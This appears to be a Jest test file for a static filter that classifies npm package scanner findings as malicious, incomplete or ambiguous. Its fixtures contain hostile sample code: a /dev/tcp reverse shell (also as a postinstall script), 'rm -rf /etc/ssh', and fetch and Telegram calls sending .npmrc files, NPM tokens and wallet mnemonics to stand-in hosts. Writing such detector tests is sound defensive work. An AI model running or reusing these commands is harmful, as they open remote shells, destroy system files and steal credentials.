import type { Finding } from '../../domain/analysis.types';
import type { CustomRuleRelationCandidate } from '../../analyzers/custom-rule/custom-rule.analyzer';
import type { RestoreResult, RestoredFile, ValidationSnapshot } from '../../analyzers/obfuscation/obfuscation.types';
import type { AgentPlanningAnalyzerSnapshot, AgentPlanningInputV0_1 } from './agent-planning-input.types';
import { collectThreatFindingRefs, evaluateStaticFilter, resolveStaticFilterStatus } from './static-filter';

function finding(ruleId: string, path = 'index.js', overrides: Partial<Finding> = {}): Finding {
  return {
    findingId: `guarddog:${ruleId}:${path}`,
    ruleId,
    type: ruleId.startsWith('capability-') ? 'CAPABILITY' : 'THREAT_INDICATOR',
    message: ruleId,
    location: { type: 'SOURCE_FILE', path, startLine: 1 },
    data: { code: `observed ${ruleId}`, match: ruleId },
    ...overrides,
  };
}

function analyzer(
  name: string,
  findings: readonly Finding[] = [],
  overrides: Partial<AgentPlanningAnalyzerSnapshot> = {},
): AgentPlanningAnalyzerSnapshot {
  return {
    analyzer: name,
    analyzerVersion: '0.2.0',
    status: 'SUCCESS',
    findings,
    errors: [],
    ...overrides,
  };
}

function validation(): ValidationSnapshot {
  const source = {
    parse: { valid: true }, bytes: 20, identifierCount: 2,
    hexIdentifierCount: 0, hexIdRatio: 0, score: 1, signals: [],
  };
  return {
    original: source, restored: source, byteDelta: 0, byteRatio: 1,
    identifierDelta: 0, hexIdentifierDelta: 0, scoreDelta: 0,
    addedSignals: [], removedSignals: [],
    capability: { before: [], after: [], status: 'PRESERVED', lost: [] },
  };
}

function restoredFile(
  status: RestoredFile['status'] = 'RESTORED',
  limitations: RestoredFile['limitations'] = [],
): RestoredFile {
  return {
    path: 'index.js', outputPath: '/work/derived/index.js', status,
    ...(status === 'PARTIAL_RESTORED' ? { reason: 'PARTIAL_STAGE_FAILURE' as const } : {}),
    limitations, stageResults: [], appliedStages: [], payloads: [],
    originalBytes: 20, restoredBytes: 20, verifyAfter: { score: 1, hexIdRatio: 0 },
    validation: validation(),
    lineMapping: {
      version: '0.1.0', sourcePath: 'index.js', derivedPath: 'index.js',
      status: 'MAPPED', entries: [{ derivedLine: 1, sourceLine: 1, confidence: 'EXACT' }],
      derivedLineCount: 1, mappedLineCount: 1, limitations: [],
    },
    durationMs: 1,
  };
}

function restore(overrides: Partial<RestoreResult> = {}): RestoreResult {
  return {
    outputRoot: '/work/derived', restored: [], unresolved: [],
    durationMs: 1, budgetExceeded: false, ...overrides,
  };
}

function relation(): CustomRuleRelationCandidate {
  return {
    relationId: 'relation-1', relationType: 'DOWNLOAD_TO_EXECUTE',
    sourceFindingIds: ['custom-rule:source:0'], sinkFindingIds: ['custom-rule:sink:0'],
    evidenceKind: 'STATIC_DATA_FLOW', analysisLevel: 'DATA_FLOW', executionContext: 'INSTALL',
    status: 'CANDIDATE',
    provenance: { source: 'CUSTOM_STATIC_RULE', analyzer: 'custom-rule', analyzerVersion: '0.2.0' },
    locations: {
      sources: [{ type: 'SOURCE_FILE', path: 'index.js', startLine: 1 }],
      sinks: [{ type: 'SOURCE_FILE', path: 'index.js', startLine: 2 }],
    },
    limitations: ['candidate only'],
  };
}

function input(options: {
  tier1?: readonly AgentPlanningAnalyzerSnapshot[];
  tier2Analyzer?: AgentPlanningAnalyzerSnapshot;
  derived?: readonly AgentPlanningAnalyzerSnapshot[];
  restore?: RestoreResult;
  selection?: { scannedFiles: number; selectedFiles: number };
  unmapped?: AgentPlanningInputV0_1['normalization']['unmappedFindings'];
} = {}): AgentPlanningInputV0_1 {
  return {
    schemaVersion: '0.1.0',
    subject: {
      requestId: 'request-1', scanId: 'scan-1', ecosystem: 'npm',
      packageName: 'example', packageVersion: '1.0.0', artifactHash: 'hash',
    },
    tier1: { analyzers: options.tier1 ?? [] },
    tier2: {
      analyzer: options.tier2Analyzer ?? analyzer('obfuscation'),
      derivedAnalyzers: options.derived ?? [],
      ...(options.restore === undefined ? {} : { restore: options.restore }),
      ...(options.selection === undefined ? {} : { selection: options.selection }),
    },
    normalization: {
      atomicEvidences: [],
      unmappedFindings: options.unmapped ?? [],
      errors: [],
      summary: {
        inputFindingCount: 0, normalizedFindingCount: 0, atomicEvidenceCount: 0,
        unmappedFindingCount: options.unmapped?.length ?? 0, invalidFindingCount: 0,
        deduplicatedEvidenceCount: 0, normalizerVersion: '0.1.0',
        mappingVersion: '0.5.0', mappingHash: 'mapping-hash',
      },
    },
  };
}

function diagnostic(result: ReturnType<typeof evaluateStaticFilter>, ruleId: string) {
  const value = result.diagnostics.find((item) => item.ruleId === ruleId);
  if (value === undefined) throw new Error(`Missing diagnostic ${ruleId}`);
  return value;
}

function deepFreeze(value: unknown): void {
  if (typeof value !== 'object' || value === null || Object.isFrozen(value)) return;
  Object.freeze(value);
  for (const child of Object.values(value)) deepFreeze(child);
}

describe('evaluateStaticFilter', () => {
  it('keeps malicious precedence independent from unrelated incompleteness and ambiguity', () => {
    expect(resolveStaticFilterStatus({
      hasMalicious: true, hasThreat: true, hasIncomplete: true,
    })).toBe('STATIC_MALICIOUS');
    expect(resolveStaticFilterStatus({
      hasMalicious: false, hasThreat: false, hasIncomplete: true,
    })).toBe('NO_ESCALATION_SIGNAL');
    expect(resolveStaticFilterStatus({
      hasMalicious: false, hasThreat: true, hasIncomplete: true,
    })).toBe('STATIC_INCOMPLETE');
    expect(resolveStaticFilterStatus({
      hasMalicious: false, hasThreat: true, hasIncomplete: false,
    })).toBe('AMBIGUOUS');
  });

  it('does not confirm destructive execution when the same-file combination lacks semantic evidence', () => {
    const result = evaluateStaticFilter(input({
      tier1: [analyzer('guarddog', [
        finding('threat-filesystem-destruction'),
        finding('capability-process-spawn'),
      ])],
    }));

    expect(result.status).toBe('STATIC_INCOMPLETE');
    expect(diagnostic(result, 'M02')).toMatchObject({
      outcome: 'UNVERIFIED',
      linked: { required: false, status: 'NOT_REQUIRED', basis: [] },
      blockingConditions: expect.arrayContaining(['SAME_FILE_COMBINATION']),
    });
    expect(diagnostic(result, 'M02').conditions).toContainEqual(expect.objectContaining({
      condition: 'SAME_FILE_COMBINATION', status: 'UNVERIFIED',
    }));
  });

  it('does not treat relation candidates or referenced Finding IDs as LINKED', () => {
    const source = finding('custom.download', 'index.js', { findingId: 'custom-rule:source:0' });
    const sink = finding('custom.execute', 'index.js', { findingId: 'custom-rule:sink:0' });
    const result = evaluateStaticFilter(input({
      tier1: [analyzer('custom-rule', [source, sink], {
        customRule: { relationCandidates: [relation()] },
      })],
    }));

    expect(diagnostic(result, 'A09')).toMatchObject({
      outcome: 'UNVERIFIED', linked: { status: 'UNVERIFIED', basis: [] },
    });
    expect(result.reasonCodes).toContain('RELATION_CANDIDATE_UNVERIFIED');
  });

  it('does not confirm a reverse shell from a rule hit or function-name-like snippet', () => {
    const reverse = finding('threat-network-reverse-shell', 'shell.js', {
      data: { code: 'function reverse_shell() {}', match: 'reverse_shell' },
    });
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [reverse])] }));

    expect(diagnostic(result, 'M01')).toMatchObject({
      outcome: 'UNVERIFIED', linked: { status: 'NOT_REQUIRED' },
    });
    expect(diagnostic(result, 'M01').blockingConditions).toEqual(expect.arrayContaining([
      'DIRECT_COMMAND_MATCH',
    ]));
  });

  it('confirms M01 from an actual reverse-shell command without claiming execution linkage', () => {
    const reverse = finding('threat-network-reverse-shell', 'shell.js', {
      data: { code: `exec("bash -i >& /dev/tcp/198.51.100.7/4444 0>&1")`, match: '/dev/tcp/' },
    });
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [reverse])] }));

    expect(result.status).toBe('STATIC_MALICIOUS');
    expect(result.ruleVersion).toBe('0.4.0');
    expect(diagnostic(result, 'M01')).toMatchObject({
      outcome: 'SATISFIED',
      linked: { required: false, status: 'NOT_REQUIRED', basis: [] },
    });
    expect(result.appliedRuleIds).toContain('I08');
  });

  it('confirms M02 for an important-path destructive command in the same execution call', () => {
    const code = `exec('rm -rf /etc/ssh')`;
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-filesystem-destruction', 'cleanup.js', { data: { code, match: 'rm -rf /etc/ssh' } }),
      finding('capability-process-spawn', 'cleanup.js', { data: { code, match: 'exec(' } }),
    ])] }));

    expect(diagnostic(result, 'M02')).toMatchObject({ outcome: 'SATISFIED', linked: { status: 'NOT_REQUIRED' } });
    expect(diagnostic(result, 'M02').conditions).toContainEqual(expect.objectContaining({
      condition: 'SAME_FILE_COMBINATION', status: 'SATISFIED',
    }));
  });

  it.each([
    ['repeated recursive flag letters', `exec('rm -${'f'.repeat(10_000)} /etc/ssh')`],
    ['uppercase recursive flags', `exec('rm -RF /etc/ssh')`],
  ])('confirms M02 without ambiguous backtracking for %s', (_name, code) => {
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-filesystem-destruction', 'cleanup.js', { data: { code, match: 'rm' } }),
      finding('capability-process-spawn', 'cleanup.js', { data: { code, match: 'exec(' } }),
    ])] }));

    expect(diagnostic(result, 'M02').outcome).toBe('SATISFIED');
  });

  it('does not treat rm flags without recursive or force as important-path destruction', () => {
    const code = `exec('rm -abc /etc/ssh')`;
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-filesystem-destruction', 'cleanup.js', { data: { code, match: 'rm' } }),
      finding('capability-process-spawn', 'cleanup.js', { data: { code, match: 'exec(' } }),
    ])] }));

    expect(diagnostic(result, 'M02').outcome).toBe('UNVERIFIED');
  });

  it('exposes the M02 heuristic limitation for unrelated same-file destruction and spawn', () => {
    const destructive = `const cleanupCommand = 'rm -rf /etc/ssh'`;
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-filesystem-destruction', 'worker.js', { data: { code: destructive, match: 'rm -rf /etc/ssh' } }),
      finding('capability-process-spawn', 'worker.js', { data: { code: `spawn('safe-tool')`, match: 'spawn' } }),
    ])] }));
    expect(diagnostic(result, 'M02')).toMatchObject({ outcome: 'SATISFIED', linked: { status: 'NOT_REQUIRED' } });
  });

  it('does not confirm M02 when required Findings resolve to different files', () => {
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-filesystem-destruction', 'cleanup.js', { data: { code: `rm -rf /etc/ssh`, match: 'rm' } }),
      finding('capability-process-spawn', 'worker.js', { data: { code: `spawn('safe-tool')`, match: 'spawn' } }),
    ])] }));
    expect(diagnostic(result, 'M02').outcome).toBe('UNVERIFIED');
    expect(diagnostic(result, 'M02').conditions).toContainEqual(expect.objectContaining({
      condition: 'SAME_FILE', status: 'NOT_SATISFIED',
    }));
  });

  it.each([
    ['different calls', `exec('rm -rf /tmp/cache'); spawn('safe-tool')`],
    ['temporary cleanup', `exec('rm -rf /tmp/cache')`],
    ['comment only', `// exec('rm -rf /etc/ssh')\nspawn('safe-tool')`],
    ['string example', `const example = "exec('rm -rf /etc/ssh')"; spawn('safe-tool')`],
  ])('does not confirm M02 from %s', (_name, code) => {
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-filesystem-destruction', 'cleanup.js', { data: { code, match: 'cleanup' } }),
      finding('capability-process-spawn', 'cleanup.js', { data: { code, match: 'spawn' } }),
    ])] }));
    expect(diagnostic(result, 'M02').outcome).toBe('UNVERIFIED');
  });

  it('confirms M03 from same-file hits and a sensitive-file read without claiming data flow', () => {
    const code = `fetch('https://collector.example/upload', { body: fs.readFileSync('/home/user/.npmrc') })`;
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-filesystem-read', 'send.js', { data: { code, match: '.npmrc' } }),
      finding('capability-filesystem-read', 'send.js', { data: { code, match: 'readFileSync' } }),
      finding('capability-network-outbound', 'send.js', { data: { code, match: 'fetch' } }),
    ])] }));
    expect(diagnostic(result, 'M03')).toMatchObject({ outcome: 'SATISFIED', linked: { status: 'NOT_REQUIRED' } });
  });

  it('does not confirm M03 from a sensitive path string without a read call', () => {
    const code = `fetch('https://collector.example/upload', { body: '/home/user/.npmrc' })`;
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-filesystem-read', 'send.js', { data: { code, match: '.npmrc' } }),
      finding('capability-filesystem-read', 'send.js', { data: { code, match: '.npmrc' } }),
      finding('capability-network-outbound', 'send.js', { data: { code, match: 'fetch' } }),
    ])] }));
    expect(diagnostic(result, 'M03').outcome).toBe('UNVERIFIED');
  });

  it('documents the M03 heuristic limitation when unrelated same-file actions coexist', () => {
    const code = `const content = fs.readFileSync('/home/user/.npmrc'); fetch('https://example.org/status')`;
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-filesystem-read', 'send.js', { data: { code, match: '.npmrc' } }),
      finding('capability-filesystem-read', 'send.js', { data: { code, match: 'readFileSync' } }),
      finding('capability-network-outbound', 'send.js', { data: { code, match: 'fetch' } }),
    ])] }));
    expect(diagnostic(result, 'M03')).toMatchObject({ outcome: 'SATISFIED', linked: { status: 'NOT_REQUIRED' } });
  });

  it('confirms M04 for a classified credential directly placed in an external request body', () => {
    const code = `fetch('https://collector.example/report', { body: process.env.NPM_TOKEN })`;
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-runtime-environment-read', 'send.js', { data: { code, match: 'process.env.NPM_TOKEN' } }),
      finding('capability-network-outbound', 'send.js', { data: { code, match: 'fetch' } }),
    ])] }));
    expect(diagnostic(result, 'M04')).toMatchObject({ outcome: 'SATISFIED', linked: { status: 'NOT_REQUIRED' } });
    expect(diagnostic(result, 'M04').conditions).toContainEqual(expect.objectContaining({
      condition: 'SENSITIVE_DATA_CLASSIFIED', status: 'SATISFIED', detail: 'CREDENTIAL_ENV:NPM_TOKEN',
    }));
  });

  it.each([
    ['normal setting', `fetch('https://service.example/config', { body: process.env.NODE_ENV })`],
    ['normal authentication header', `fetch('https://service.example/me', { headers: { Authorization: process.env.API_TOKEN } })`],
    ['comment-only credential', `fetch('https://service.example/report', { body: 'status' /* process.env.API_TOKEN */ })`],
  ])('does not confirm M04 for %s', (_name, code) => {
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-runtime-environment-read', 'send.js', { data: { code, match: 'process.env' } }),
      finding('capability-network-outbound', 'send.js', { data: { code, match: 'fetch' } }),
    ])] }));
    expect(diagnostic(result, 'M04').outcome).toBe('UNVERIFIED');
  });

  it('confirms M05 from same-file messenger and sensitive collection without module provenance', () => {
    const code = `const TelegramBot = require('node-telegram-bot-api'); const bot = new TelegramBot(token); bot.sendMessage(chatId, 'seed=' + process.env.MNEMONIC);`;
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-network-exfil-messenger', 'send.js', { data: { code, match: 'TelegramBot' } }),
      finding('threat-runtime-environment-read', 'send.js', { data: { code, match: 'process.env.MNEMONIC' } }),
    ])] }));
    expect(diagnostic(result, 'M05')).toMatchObject({
      outcome: 'SATISFIED', linked: { required: false, status: 'NOT_REQUIRED', basis: [] },
    });
  });

  it('documents that M05 does not prove argument or module linkage', () => {
    for (const [code, outcome] of [
      [`const TelegramBot = require('node-telegram-bot-api'); const bot = new TelegramBot(token); bot.sendMessage(process.env.MNEMONIC, 'hello');`, 'UNVERIFIED'],
      [`const bot = new TelegramBot(token); bot.sendMessage(chatId, process.env.MNEMONIC);`, 'SATISFIED'],
      [`...to\r\n    const bot = new TelegramBot(token, { polling: false }); // Polling is not needed\r\n    bot.sendMessage(chatId, \`env.KEY=\` + process.env.MNEMONIC);`, 'SATISFIED'],
      [`client.sendMessage(chatId, process.env.MNEMONIC);`, 'SATISFIED'],
    ]) {
      const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
        finding('threat-network-exfil-messenger', 'send.js', { data: { code, match: 'messenger' } }),
        finding('threat-runtime-environment-read', 'send.js', { data: { code, match: 'process.env.MNEMONIC' } }),
      ])] }));
      expect(diagnostic(result, 'M05')).toMatchObject({ outcome, linked: { status: 'NOT_REQUIRED' } });
    }
  });

  it('does not confirm M05 from a messenger API name without sensitive collection', () => {
    const code = `bot.sendMessage(chatId, 'hello')`;
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-network-exfil-messenger', 'send.js', { data: { code, match: 'sendMessage' } }),
    ])] }));
    expect(diagnostic(result, 'M05').outcome).toBe('NOT_APPLICABLE');
  });

  it('does not confirm M05 when the matching context shows a fixed normal bot message', () => {
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-network-exfil-messenger', 'send.js', {
        data: { code: `bot.sendMessage(chatId, 'service started')`, match: 'sendMessage' },
      }),
      finding('threat-runtime-environment-read', 'send.js', {
        data: { code: `const token = process.env.BOT_TOKEN`, match: 'process.env.BOT_TOKEN' },
      }),
    ])] }));
    expect(diagnostic(result, 'M05').outcome).toBe('UNVERIFIED');
  });

  it('keeps M06 and M08 disabled as independent malicious confirmation rules', () => {
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-process-download-exec'), finding('capability-network-download'),
      finding('capability-process-spawn'), finding('threat-runtime-self-propagation'),
    ])] }));
    expect(diagnostic(result, 'M06')).toMatchObject({ outcome: 'UNVERIFIED', linked: { status: 'NOT_REQUIRED' } });
    expect(diagnostic(result, 'M08')).toMatchObject({ outcome: 'UNVERIFIED', linked: { status: 'NOT_REQUIRED' } });
    expect(result.status).not.toBe('STATIC_MALICIOUS');
  });

  it('adds M07 installation context only when the lifecycle command directly contains confirmed malicious behavior', () => {
    const command = `bash -i >& /dev/tcp/198.51.100.7/4444 0>&1`;
    const result = evaluateStaticFilter(input({ tier1: [
      analyzer('guarddog', [finding('threat-network-reverse-shell', 'shell.js', {
        data: { code: `exec('${command}')`, match: '/dev/tcp/' },
      })]),
      analyzer('metadata', [finding('metadata.lifecycle.postinstall', 'package.json', {
        findingId: 'metadata:lifecycle:0', location: { type: 'METADATA', jsonPointer: '/scripts/postinstall' },
        data: { scriptName: 'postinstall', scriptValue: command, observation: 'PRESENT' },
      })]),
    ] }));
    expect(diagnostic(result, 'M01').outcome).toBe('SATISFIED');
    expect(diagnostic(result, 'M07')).toMatchObject({ outcome: 'SATISFIED', linked: { status: 'CONFIRMED' } });
  });

  it('does not add M07 for an unrelated lifecycle command beside a confirmed M rule', () => {
    const result = evaluateStaticFilter(input({ tier1: [
      analyzer('guarddog', [
        finding('threat-runtime-environment-read', 'send.js', {
          data: { code: `fetch('https://collector.example', { body: process.env.NPM_TOKEN })` },
        }),
        finding('capability-network-outbound', 'send.js', {
          data: { code: `fetch('https://collector.example', { body: process.env.NPM_TOKEN })` },
        }),
      ]),
      analyzer('metadata', [finding('metadata.lifecycle.postinstall', 'package.json', {
        data: { scriptName: 'postinstall', scriptValue: 'rm -rf /etc/important' },
      })]),
    ] }));
    expect(diagnostic(result, 'M04').outcome).toBe('SATISFIED');
    expect(diagnostic(result, 'M07').outcome).toBe('UNVERIFIED');
  });

  it('records missing direct matching evidence without inventing confirmation', () => {
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('threat-runtime-environment-read', 'send.js', { data: { match: 'process.env.API_TOKEN' } }),
      finding('capability-network-outbound', 'send.js', { data: { match: 'fetch' } }),
    ])] }));
    expect(diagnostic(result, 'M04')).toMatchObject({ outcome: 'UNVERIFIED', linked: { status: 'NOT_REQUIRED' } });
    expect(result.appliedRuleIds).toContain('I02');
    expect(result.reasonCodes).toContain('EVIDENCE_CONTEXT_MISSING');
    expect(result.status).not.toBe('STATIC_MALICIOUS');
  });

  it('binds Evidence references by analyzer and raw Finding ID', () => {
    const raw = finding('threat-network-reverse-shell', 'shell.js', { findingId: 'shared-id' });
    const value = input({
      tier1: [
        analyzer('guarddog', [raw]),
        analyzer('custom-rule', [finding('custom.other', 'other.js', { findingId: 'shared-id' })]),
      ],
    });
    value.normalization.atomicEvidences.push({
      schemaVersion: '0.1', evidenceId: 'evidence-guarddog', kind: 'ATOMIC',
      signal: { id: 'reverse-shell', type: 'SHELL_EXEC', category: 'EXECUTION' },
      subject: value.subject,
      assertion: { summary: 'reverse shell pattern', basis: 'PATTERN_MATCH' },
      sources: [{
        analyzer: 'guarddog', analyzerVersion: '0.2.0',
        ruleId: raw.ruleId, rawFindingId: raw.findingId,
      }],
      locations: raw.location === undefined ? [] : [raw.location],
      provenance: {
        scanId: 'scan-1', generatedBy: 'EVIDENCE_NORMALIZER',
        observedAt: '2026-10-01T00:00:00.000Z',
      },
      limitations: [],
    });

    const result = evaluateStaticFilter(value);
    expect(diagnostic(result, 'M01').evidenceRefs).toEqual([{ evidenceId: 'evidence-guarddog' }]);
  });

  it.each([
    ['cache cleanup', ['threat-filesystem-destruction', 'capability-process-spawn']],
    ['normal authentication', ['threat-runtime-environment-read', 'capability-network-outbound']],
    ['download and execute', ['threat-process-download-exec', 'capability-network-download', 'capability-process-spawn']],
  ])('does not over-confirm %s from raw rule combinations', (_name, ruleIds) => {
    const result = evaluateStaticFilter(input({
      tier1: [analyzer('guarddog', ruleIds.map((ruleId) => finding(ruleId)))],
    }));
    expect(result.status).not.toBe('STATIC_MALICIOUS');
    expect(result.diagnostics.filter(({ category }) => category === 'MALICIOUS'))
      .not.toContainEqual(expect.objectContaining({ outcome: 'SATISFIED' }));
  });

  it('does not use an unrelated malicious-rule hit as downloaded payload proof', () => {
    const result = evaluateStaticFilter(input({
      tier1: [analyzer('guarddog', [
        finding('threat-process-download-exec', 'loader.js'),
        finding('capability-network-download', 'loader.js'),
        finding('capability-process-spawn', 'loader.js'),
        finding('threat-network-reverse-shell', 'unrelated.js'),
      ])],
    }));

    expect(diagnostic(result, 'M06')).toMatchObject({ outcome: 'UNVERIFIED' });
    expect(diagnostic(result, 'M06').blockingConditions)
      .toContain('INDEPENDENT_MALICIOUS_CONFIRMATION_DISABLED');
  });

  it('applies restoration and budget incompleteness only to an exactly related path', () => {
    const obfuscation = finding('threat-runtime-obfuscation-general', 'index.js');
    const related = evaluateStaticFilter(input({
      tier1: [analyzer('guarddog', [obfuscation])],
      restore: restore({
        unresolved: [{
          path: 'index.js', status: 'UNRESOLVED', reason: 'BUDGET_EXCEEDED',
          limitations: ['BUDGET_EXCEEDED'], stageResults: [],
        }],
        budgetExceeded: true,
      }),
    }));
    const unrelated = evaluateStaticFilter(input({
      tier1: [analyzer('guarddog', [obfuscation])],
      restore: restore({
        unresolved: [{
          path: 'other.js', status: 'UNRESOLVED', reason: 'BUDGET_EXCEEDED',
          limitations: ['BUDGET_EXCEEDED'], stageResults: [],
        }],
        budgetExceeded: true,
      }),
    }));

    expect(related.appliedRuleIds).toEqual(expect.arrayContaining(['A01', 'I04', 'I05']));
    expect(unrelated.appliedRuleIds).not.toEqual(expect.arrayContaining(['I04']));
    expect(unrelated.appliedRuleIds).not.toEqual(expect.arrayContaining(['I05']));
  });

  it('distinguishes a normal empty selection from the safe fallback', () => {
    const normal = evaluateStaticFilter(input({
      selection: { scannedFiles: 0, selectedFiles: 0 }, restore: restore(),
    }));
    const fallback = evaluateStaticFilter(input({
      tier2Analyzer: analyzer('obfuscation', [], { status: 'FAILED', errors: [{
        code: 'INTERNAL_ERROR', stage: 'ANALYZER:OBFUSCATION', analyzer: 'obfuscation',
        message: 'failed', retryable: false,
      }] }),
    }));

    expect(normal.appliedRuleIds).not.toContain('I01');
    expect(fallback.appliedRuleIds).toContain('I01');
    expect(normal.status).toBe('NO_ESCALATION_SIGNAL');
    expect(fallback.status).toBe('NO_ESCALATION_SIGNAL');
    expect(fallback.appliedRuleIds).toContain('I08');
    expect(fallback.reasonCodes).toContain('NO_THREAT_FINDING');
  });

  it('preserves ambiguity reasons when incompleteness has final priority', () => {
    const result = evaluateStaticFilter(input({
      tier1: [analyzer('guarddog', [
        finding('threat-filesystem-read'), finding('capability-network-outbound'),
      ])],
    }));

    expect(result.status).toBe('STATIC_INCOMPLETE');
    expect(result.appliedRuleIds).toEqual(expect.arrayContaining(['A02', 'I08']));
    expect(result.reasonCodes).toEqual(expect.arrayContaining([
      'BEHAVIOR_LINK_UNVERIFIED', 'SCAN_COVERAGE_UNKNOWN',
    ]));
  });

  it('does not validate a derived M finding with partial restoration limitations', () => {
    const derivedReverse = finding('threat-network-reverse-shell', 'index.js', {
      findingId: 'guarddog-deobfuscated:reverse:0',
      location: {
        type: 'SOURCE_FILE', path: 'index.js', representation: 'DEOBFUSCATED',
        lineageStatus: 'MAPPED', derivedFrom: { path: 'index.js', startLine: 1 },
      },
    });
    const result = evaluateStaticFilter(input({
      derived: [analyzer('guarddog-deobfuscated', [derivedReverse])],
      restore: restore({ restored: [restoredFile('PARTIAL_RESTORED', ['STRUCTURE_STAGE_FAILED'])] }),
    }));

    expect(diagnostic(result, 'M01').conditions).toContainEqual(expect.objectContaining({
      condition: 'VALID', status: 'UNVERIFIED',
    }));
    expect(result.status).not.toBe('STATIC_MALICIOUS');
  });

  it('applies normalization gaps only when a relevant unmapped item has no Raw Finding', () => {
    const result = evaluateStaticFilter(input({
      unmapped: [{
        findingId: 'guarddog:missing', analyzerName: 'guarddog', analyzerVersion: '0.2.0',
        ruleId: 'threat-filesystem-read', mappingStatus: 'UNMAPPED', reason: 'missing raw input',
      }],
    }));
    expect(result.appliedRuleIds).toContain('I03');
    expect(result.reasonCodes).toContain('NORMALIZATION_GAP');
  });

  it('uses NO_ESCALATION_SIGNAL for no threat while preserving I08', () => {
    const result = evaluateStaticFilter(input({
      tier1: [analyzer('metadata'), analyzer('custom-rule'), analyzer('guarddog')],
      selection: { scannedFiles: 0, selectedFiles: 0 }, restore: restore(),
    }));

    expect(result.status).toBe('NO_ESCALATION_SIGNAL');
    expect(result.appliedRuleIds).toContain('I08');
    expect(result.reasonCodes).toContain('SCAN_COVERAGE_UNKNOWN');
    expect(result.reasonCodes).toContain('NO_THREAT_FINDING');
    expect(result.threat).toEqual({ present: false, findingRefs: [] });
  });

  it('keeps unclassified threat findings under review', () => {
    const result = evaluateStaticFilter(input({
      tier1: [analyzer('guarddog', [finding('threat-new-unmapped-behavior')])],
    }));
    expect(result.reasonCodes).toContain('UNCLASSIFIED_THREAT_REVIEW_REQUIRED');
    expect(result.status).not.toBe('NO_ESCALATION_SIGNAL');
  });

  it('does not escalate capability-only and relation-candidate inputs despite preserved A/I diagnostics', () => {
    const capabilityOnly = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('capability-network-download'), finding('capability-process-spawn'),
    ])] }));
    const withRelation = evaluateStaticFilter(input({ tier1: [analyzer('custom-rule', [
      finding('custom.source', 'index.js', { findingId: 'custom-rule:source:0', type: 'STATIC_PATTERN' }),
      finding('custom.sink', 'index.js', { findingId: 'custom-rule:sink:0', type: 'STATIC_PATTERN' }),
    ], { customRule: { relationCandidates: [relation()] } })] }));

    expect(capabilityOnly.status).toBe('NO_ESCALATION_SIGNAL');
    expect(capabilityOnly.appliedRuleIds).toEqual(expect.arrayContaining(['A04', 'I08']));
    expect(withRelation.status).toBe('NO_ESCALATION_SIGNAL');
    expect(withRelation.appliedRuleIds).toEqual(expect.arrayContaining(['A09', 'I08']));
    expect(withRelation.reasonCodes).toContain('NO_THREAT_FINDING');
  });

  it('detects threat Findings across Tier 2, derived, and unmapped normalization state', () => {
    const tier2Finding = finding('threat-tier2-only', 'tier2.js', { findingId: 'obfuscation:threat:0' });
    const derivedFinding = finding('custom-derived-threat', 'derived.js', {
      findingId: 'guarddog-deobfuscated:threat:0', type: 'THREAT_INDICATOR',
    });
    const value = input({
      tier2Analyzer: analyzer('obfuscation', [tier2Finding]),
      derived: [analyzer('guarddog-deobfuscated', [derivedFinding])],
      unmapped: [{
        findingId: tier2Finding.findingId, analyzerName: 'obfuscation', analyzerVersion: '0.2.0',
        ruleId: tier2Finding.ruleId, mappingStatus: 'UNMAPPED', reason: 'not normalized',
      }],
    });
    const refs = collectThreatFindingRefs(value);
    const result = evaluateStaticFilter(value);

    expect(refs).toEqual(expect.arrayContaining([
      { analyzer: 'obfuscation', findingId: tier2Finding.findingId },
      { analyzer: 'guarddog-deobfuscated', findingId: derivedFinding.findingId },
    ]));
    expect(result.threat).toEqual({ present: true, findingRefs: refs });
    expect(result.status).toBe('STATIC_INCOMPLETE');
  });

  it('does not infer threat presence from GuardDog assessment, risks, or capabilities', () => {
    const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [
      finding('capability-network-outbound'),
    ], {
      guarddog: { risks: [{ rule: 'risk', result: 'observed' }], toolAssessment: {
        score: 99, label: 'high_risk', findingsCount: 1, scoreBreakdown: {}, raw: {},
      } },
    })] }));
    expect(result.threat).toEqual({ present: false, findingRefs: [] });
    expect(result.status).toBe('NO_ESCALATION_SIGNAL');
  });

  it.each(['FAILED', 'TIMEOUT', 'PARTIAL'] as const)(
    'does not escalate a threat-free %s analyzer result',
    (status) => {
      const result = evaluateStaticFilter(input({ tier1: [analyzer('guarddog', [], {
        status,
        errors: [{
          code: 'INTERNAL_ERROR', stage: 'ANALYZER:GUARDDOG', analyzer: 'guarddog',
          message: status, retryable: false,
        }],
      })] }));
      expect(result.status).toBe('NO_ESCALATION_SIGNAL');
      expect(result.appliedRuleIds).toEqual(expect.arrayContaining(['I01', 'I08']));
      expect(result.reasonCodes).toContain('NO_THREAT_FINDING');
    },
  );

  it('is deterministic and accepts a deeply frozen input without mutation', () => {
    const value = input({
      tier1: [analyzer('guarddog', [finding('threat-runtime-keylogging')])],
      selection: { scannedFiles: 1, selectedFiles: 0 }, restore: restore(),
    });
    deepFreeze(value);

    const first = evaluateStaticFilter(value);
    const second = evaluateStaticFilter(value);

    expect(second).toEqual(first);
    expect(Object.isFrozen(value)).toBe(true);
